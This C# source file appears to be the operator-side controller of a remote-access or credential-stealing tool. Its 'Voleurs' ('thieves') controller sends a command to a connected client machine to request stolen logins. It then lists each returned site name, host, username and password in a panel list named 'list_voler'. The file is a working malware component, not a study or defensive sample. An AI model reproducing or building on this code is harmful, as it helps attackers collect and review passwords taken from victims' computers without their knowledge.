using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Serveur_Client_PCC.Controller
{
    class VoleursController : ControllerBase
    {
        public const string Name = "Voleurs";

        public void Voleurs(string json)
        {
            dynamic data = serializer.DeserializeObject(json);

            formPanel.list_voler.Invoke((MethodInvoker)(() => { formPanel.list_voler.Items.Clear(); }));
            foreach (dynamic item in data["logins"])
            {
                formPanel.list_voler.Invoke((MethodInvoker)(() =>
                {
                    formPanel.list_voler.Items.Add(new ListViewItem(new string[] { Convert.ToString(item["name"]), Convert.ToString(item["host"]), Convert.ToString(item["login"]), Convert.ToString(item["password"]) }));
                }));
            }
        }

        public void ReqVoleurs(string argv1)
        {
            Dictionary<string, object> obj = new Dictionary<string, object>();
            obj.Add("controller", Name);
            obj.Add("method", "Voleurs");

            List<string> parameters = new List<string> { argv1 };
            obj.Add("parameters", parameters);

            send(Encode(obj));
        }

    }
}
